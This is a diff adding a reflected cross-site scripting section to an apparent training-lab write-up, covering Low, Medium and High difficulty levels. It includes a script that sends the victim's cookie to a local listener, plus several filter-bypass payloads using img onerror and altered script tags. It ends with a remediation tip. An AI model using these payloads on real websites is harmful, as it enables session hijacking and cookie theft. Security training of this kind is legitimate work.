@@ -287,6 +287,36 @@ Now the page rejects any ``<script`` patterns. We can circumvent this by adding 
  
  # XSS (Reflected)
  
+ This is an attack where a link is sent to the victim whom after clicking on the link executes the malicious script.
+ 
+ ## Low
+ 
+We can use the following script to execute it: `` <script>window.location='http://127.0.0.1:1337?cookie='+document.cookie</script>``. This sets the clicked on link to redirect the cookie to out http server. Now after this is executed our webserver receives the request:
+
+ ![image](https://user-images.githubusercontent.com/39514108/149861915-33293ed4-2b06-4f55-aa37-9d58853c85cb.png)
+
+ ## Medium
+ 
+ Now the page checks for the <script> tag. This can be avoided in several ways:
+ 
+ * <img src=image.png onerror=alert(document.cookie)>
+ * <scr<script>ipt>alert(document.cookie)</script>
+ * <SCRIPT>alert(document.cookie)</SCRIPT>
+ 
+ ## High
+ 
+ The following can be used to pass the level:
+ 
+ *  <img src=image.png onerror=alert(document.cookie)>
+ 
+ Or all image tags of HTML events.
+ 
+ ## Remarks
+ 
+ PHP function such as ``htmlspecialchars()`` should be used to escape any characters that are present. 
+ 
+ # XSS (Stored)
+ 
  
  
 
